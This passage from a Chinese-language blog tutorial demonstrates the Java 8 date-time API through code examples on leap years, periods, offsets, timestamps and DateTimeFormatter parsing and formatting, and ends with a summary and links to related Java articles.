punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"您的信用卡到期是： %s%n"</span><span class="token punctuation">,</span> creditCardExpiry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 您的信用卡到期是： 2018-02</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据上述数据，你可以提醒客户信用卡快要到期了，个人认为这个类非常有用。</p><h3 id="示例-14、如何在Java8中检查闰年"><a href="#示例-14、如何在Java8中检查闰年" class="headerlink" title="示例 14、如何在Java8中检查闰年"></a>示例 14、如何在Java8中检查闰年</h3><p><code>LocalDate</code>类有一个很实用的方法<code>isLeapYear()</code>判断该实例是否是一个闰年，如果你还是想重新发明轮子，这有一个代码示例，纯<a href="http://java67.blogspot.sg/2012/12/how-to-check-leap-year-in-java-program.html">Java逻辑编写的判断闰年</a>的程序。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> today <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>today<span class="token punctuation">.</span><span class="token function">isLeapYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"今年是闰年！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"今年不是闰年！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 今年是闰年！</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>你可以多写几个日期来验证是否是闰年，最好是写<code>JUnit</code>单元测试做判断。</p><h3 id="示例-15、计算两个日期之间的天数和月数"><a href="#示例-15、计算两个日期之间的天数和月数" class="headerlink" title="示例 15、计算两个日期之间的天数和月数"></a>示例 15、计算两个日期之间的天数和月数</h3><p>有一个常见日期操作是计算两个日期之间的天数、周数或月数。在Java8中可以用<code>java.time.Period</code>类来做计算。下面这个例子中，我们计算了当天和将来某一天之间的月数。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDate</span> today <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> java8Release <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2016</span><span class="token punctuation">,</span> <span class="token class-name">Month</span><span class="token punctuation">.</span><span class="token constant">APRIL</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Period</span> periodToNext <span class="token operator">=</span> <span class="token class-name">Period</span><span class="token punctuation">.</span><span class="token function">between</span><span class="token punctuation">(</span>today<span class="token punctuation">,</span> java8Release<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2016年4月21日距离今天的天数："</span> <span class="token operator">+</span> periodToNext<span class="token punctuation">.</span><span class="token function">getDays</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 2016年4月21日距离今天的天数：3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面可以看到现在是一月，Java8的中计算的当前日期是4月18日，中间相隔3天。</p><h3 id="示例-16、包含时差信息的日期和时间"><a href="#示例-16、包含时差信息的日期和时间" class="headerlink" title="示例 16、包含时差信息的日期和时间"></a>示例 16、包含时差信息的日期和时间</h3><p>在Java8中，<code>ZoneOffset</code>类用来表示时区，举例来说印度与GMT或UTC标准时区相差<code>+05:30</code>，可以通过<code>ZoneOffset.of()</code>静态方法来 获取对应的时区。一旦得到了时差就可以通过传入<code>LocalDateTime</code>和<code>ZoneOffset</code>来创建一个<code>OffSetDateTime</code>对象。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDateTime</span> datetime <span class="token operator">=</span> <span class="token class-name">LocalDateTime</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token number">2016</span><span class="token punctuation">,</span> <span class="token class-name">Month</span><span class="token punctuation">.</span><span class="token constant">APRIL</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ZoneOffset</span> offset <span class="token operator">=</span> <span class="token class-name">ZoneOffset</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"+05:30"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">OffsetDateTime</span> date <span class="token operator">=</span> <span class="token class-name">OffsetDateTime</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>datetime<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"包含时差信息的日期和时间 : "</span> <span class="token operator">+</span> date<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//包含时差信息的日期和时间 : 2016-04-19T23:35+05:30</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在的时间信息里已经包含了时区信息了。注意：<code>OffSetDateTime</code>是对计算机友好的，<code>ZoneDateTime</code>则对人更友好。</p><h3 id="示例-17、在Java8中获取当前的时间戳"><a href="#示例-17、在Java8中获取当前的时间戳" class="headerlink" title="示例 17、在Java8中获取当前的时间戳"></a>示例 17、在Java8中获取当前的时间戳</h3><p>如果你还记得Java8以前是如何获得当前时间戳，那么现在你终于解脱了。<code>Instant</code>类有一个静态工厂方法<code>now()</code>会返回当前的时间戳，如下所示：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Instant</span> timestamp <span class="token operator">=</span> <span class="token class-name">Instant</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"时间戳是："</span> <span class="token operator">+</span> timestamp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 时间戳是：2016-04-18T15:41:06.876Z</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>时间戳信息里同时包含了日期和时间，这和<code>java.util.Date</code>很像。实际上<code>Instant</code>类确实等同于Java8之前的<code>Date</code>类，你可以使用<code>Date</code>类和<code>Instant</code>类各自的转换方法互相转换，例如：<code>Date.from(Instant)</code> 将<code>Instant</code>转换成<code>java.util.Date</code>，<code>Date.toInstant()</code>则是将<code>Date</code>类转换成<code>Instant</code>类。</p><h3 id="示例-18、在Java8中如何使用预定义的格式化工具去解析或格式化日期"><a href="#示例-18、在Java8中如何使用预定义的格式化工具去解析或格式化日期" class="headerlink" title="示例 18、在Java8中如何使用预定义的格式化工具去解析或格式化日期"></a>示例 18、在Java8中如何使用预定义的格式化工具去解析或格式化日期</h3><p>在Java8以前的世界里，日期和时间的格式化非常诡异，唯一的帮助类<code>SimpleDateFormat</code>也是非线程安全的，而且用作局部变量解析和格式化日期时显得很笨重。幸好线程局部变量能使它在多线程环境中变得可用，不过这都是过去时了。Java8引入了全新的日期时间格式工具，线程安全而且使用方便。它自带了一些常用的内置格式化工具。下面这个例子使用了<code>BASIC_ISO_DATE</code>格式化工具将2016年4月18日格式化成20160418。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> day <span class="token operator">=</span> <span class="token string">"20160418"</span><span class="token punctuation">;</span><span class="token class-name">LocalDate</span> formatted <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>day<span class="token punctuation">,</span> <span class="token class-name">DateTimeFormatter</span><span class="token punctuation">.</span><span class="token constant">BASIC_ISO_DATE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"从字符串中解析的日期: %s 是 %s %n"</span><span class="token punctuation">,</span> day<span class="token punctuation">,</span> formatted<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 从字符串中解析的日期: 20160418 是 2016-04-18 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显的看出得到的日期和给出的日期是同一天，但是格式不同。</p><h3 id="示例-19、如何在Java中使用自定义格式化工具解析日期"><a href="#示例-19、如何在Java中使用自定义格式化工具解析日期" class="headerlink" title="示例 19、如何在Java中使用自定义格式化工具解析日期"></a>示例 19、如何在Java中使用自定义格式化工具解析日期</h3><p>上个例子使用了<a href="http://java67.blogspot.sg/2014/12/string-to-date-example-in-java-multithreading.html"><code>Java</code>内置的格式化工具</a>去解析日期字符串。尽管内置格式化工具很好用，有时还是需要定义特定的日期格式，下面这个例子展示了如何创建自定义日期格式化工具。例子中的日期格式是“MMM dd yyyy”。可以调用<code>DateTimeFormatter</code>的<code>ofPattern()</code>静态方法并传入任意格式返回其实例，格式中的字符和以前代表的一样，M代表月，m代表分。如果格式不规范会抛出<code>DateTimeParseException</code>异常，不过如果只是把M写成m这种逻辑错误是不会抛异常的。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> day <span class="token operator">=</span> <span class="token string">"2016 04 18"</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">DateTimeFormatter</span> formatter <span class="token operator">=</span> <span class="token class-name">DateTimeFormatter</span><span class="token punctuation">.</span><span class="token function">ofPattern</span><span class="token punctuation">(</span><span class="token string">"yyyy MM dd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">LocalDate</span> holiday <span class="token operator">=</span> <span class="token class-name">LocalDate</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>day<span class="token punctuation">,</span> formatter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"成功解析字符串：%s, 时间是：%s%n"</span><span class="token punctuation">,</span> day<span class="token punctuation">,</span> holiday<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">DateTimeParseException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s 解析失败!"</span><span class="token punctuation">,</span> day<span class="token punctuation">)</span><span class="token punctuation">;</span>    ex<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 成功解析字符串：2016 04 18, 时间是：2016-04-18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>日期值与传入的字符串是匹配的，只是格式不同而已。</p><h3 id="示例-20、在Java8中如何把日期转换成字符串"><a href="#示例-20、在Java8中如何把日期转换成字符串" class="headerlink" title="示例 20、在Java8中如何把日期转换成字符串"></a>示例 20、在Java8中如何把日期转换成字符串</h3><p>上 两个例子都用到了<code>DateTimeFormatter</code>类，主要是从字符串解析日期。现在我们反过来，把<code>LocalDateTime</code>日期实例转换成特定格式的字符串。这是迄今为止<a href="http://java67.blogspot.sg/2013/01/how-to-format-date-in-java-simpledateformat-example.html"><code>Java</code>日期转字符串最为简单的方式</a>了。下面的例子将返回一个代表日期的格式化字符串。和前面类似，还是需要创建<code>DateTimeFormatter</code>实例并传入格式，但这回调用的是<code>format()</code>方法，而非<code>parse()</code>方法。这个方法会把传入的日期转化成指定格式的字符串。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">LocalDateTime</span> arrivalDate  <span class="token operator">=</span> <span class="token class-name">LocalDateTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">DateTimeFormatter</span> format <span class="token operator">=</span> <span class="token class-name">DateTimeFormatter</span><span class="token punctuation">.</span><span class="token function">ofPattern</span><span class="token punctuation">(</span><span class="token string">"MMM dd yyyy  hh:mm a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> landing <span class="token operator">=</span> arrivalDate<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"格式化的日期时间:  %s %n"</span><span class="token punctuation">,</span> landing<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">DateTimeException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s 不能格式化!%n"</span><span class="token punctuation">,</span> arrivalDate<span class="token punctuation">)</span><span class="token punctuation">;</span>    ex<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 格式化的日期时间:  四月 19 2016  12:02 上午</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当前时间被指定的“MMM dd yyyy hh:mm a”格式格式化，格式包含3个代表月的字符串，时间后面带有AM和PM标记。</p><h2 id="Java-8日期时间API的重点"><a href="#Java-8日期时间API的重点" class="headerlink" title="Java 8日期时间API的重点"></a>Java 8日期时间API的重点</h2><p>通过这些例子，你肯定已经掌握了Java8日期时间API的新知识点。现在我们来回顾一下这个优雅<code>API</code>的使用要点：</p><ol><li>提供了<code>javax.time.ZoneId</code>获取时区。</li><li>提供了<code>LocalDate``和LocalTime</code>类。</li><li>Java8的所有日期和时间<code>API</code>都是不可变类并且线程安全，而现有的<code>Date</code>和<code>Calendar</code> API中的<code>java.util.Date</code>和<code>SimpleDateFormat</code>是非线程安全的。</li><li>主包是<code>java.time</code>,包含了表示日期、时间、时间间隔的一些类。里面有两个子包<code>java.time.format</code>用于格式化， <code>java.time.temporal</code>用于更底层的操作。</li><li>时区代表了地球上某个区域内普遍使用的标准时间。每个时区都有一个代号，格式通常由区域/城市构成（Asia/Tokyo），在加上与格林威治或<code>UTC</code>的时差。例如：东京的时差是+09:00。</li><li><code>OffsetDateTime</code>类实际上组合了<code>LocalDateTime</code>类和<code>ZoneOffset</code>类。用来表示包含和格林威治或UTC时差的完整日期（年、月、日）和时间（时、分、秒、纳秒）信息。</li><li><code>DateTimeFormatter</code>类用来格式化和解析时间。与<code>SimpleDateFormat</code>不同，这个类不可变并且线程安全，需要时可以给静态常量赋值。<code>DateTimeFormatter</code>类提供了大量的内置格式化工具，同时也允许你自定义。在转换方面也提供了<code>parse()</code>将字符串解析成日期，如果解析出错会抛出<code>DateTimeParseException</code>。<code>DateTimeFormatter</code>类同时还有<code>format()</code>用来格式化日期，如果出错会抛出<code>DateTimeException</code>异常。</li><li>再补充一点，日期格式“MMM d yyyy”和“MMM dd yyyy”有一些微妙的不同，第一个格式可以解析“Jan 2 2014”和“Jan 14 2014”，而第二个在解析“Jan 2 2014”就会抛异常，因为第二个格式里要求日必须是两位的。如果想修正，你必须在日期只有个位数时在前面补零，就是说“Jan 2 2014”应该写成 “Jan 02 2014”。</li></ol><p>如何使用Java8的全新日期时间API就介绍到这了。这些简单的例子对帮助理解新API非常有用。由于这些例子都基于真实任务，你在做<code>Java</code>日期编程时不用再东张西望了。我们学会了如何创建并操作日期实例，学习了纯日期、以及包含时间信息和时差信息的日期、学会了怎样计算两个日期的间隔，这些在计算当天与某个特定日期间隔的例子中都有所展示。 我们还学到了在Java8中如何线程安全地解析和格式化日期，不用再使用蹩脚的线程局部变量技巧，也不用依赖<code>Joda Time</code>第三方库。新<code>API</code>可以作为处理日期时间操作的标准。</p><p>如果你喜欢这个教程并希望看到更多关于Java 8的教程，下面这些精彩的文章都值得一看：</p><ul><li>如何在Java8中用一行代码搞定文件读取？(<a href="http://javarevisited.blogspot.sg/2015/02/how-to-read-file-in-one-line-java-8.html">示例</a>)</li><li>学习Java8的十大教程（<a href="http://java67.blogspot.sg/2014/09/top-10-java-8-tutorials-best-of-lot.html">教程</a>）</li><li>免费的Java8教程和图书 （<a href="http://javarevisited.blogspot.sg/2013/11/java-8-tutorials-resources-and-examples-lambda-expression-stream-api-functional-interfaces.html">资源</a>）</li><li>Java 8 <code>Comparator</code>例子 （<a href="http://java67.blogspot.com/2014/11/java-8-comparator-example-using-lambda-expression.html">示例</a>）</li><li>如何使用Java8的<code>Map</code>函数（<a href="http://java67.blogspot.sg/2015/01/java-8-map-function-examples.html">示例</a>）</li><li>你准备好学习Java8的认证了吗 （<a href="http://javarevisited.blogspot.sg/2014/09/latest-OCPJP-exam-java-8-certification-oracle-java-se-8.html">更多</a>）</li><li>如何使用Java8的默认方法。（<a href="http://javarevisited.blogspot.sg/2014/07/default-defender-or-extension-method-of-Java8-example-tutorial.html">看这里</a>）</li><li>开始Java8之前需要温习的十个<code>Java 7</code>特性（<a href="http://javarevisited.blogspot.sg/2014/04/10-jdk-7-features-to-revisit-before-you.html">更多</a>）</li><li>Java8学习<code>Stream API</code>十例（<a href="http://javarevisited.blogspot.sg/2014/03/2-examples-of-streams-with-Java8-collections.html">示例</a>）</li><li>如何在匿名类中使用<code>Lambda</code>表达式（<a href="http://javarevisited.blogspot.sg/2015/01/how-to-use-lambda-expression-in-place-anonymous-class-java8.html">答案</a>）</li><li>如何使用Java8的<code>Predicates</code>类过滤<code>Collection</code>？（<a href="http://javarevisited.blogspot.sg/2015/02/how-to-filter-collections-in-java-8.html">答案</a>）</li><li><code>Java</code>中如何随即访问文件？（<a href="http://javarevisited.blogspot.sg/2015/02/randomaccessfile-example-in-java-read-write-String.html">答案</a>）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
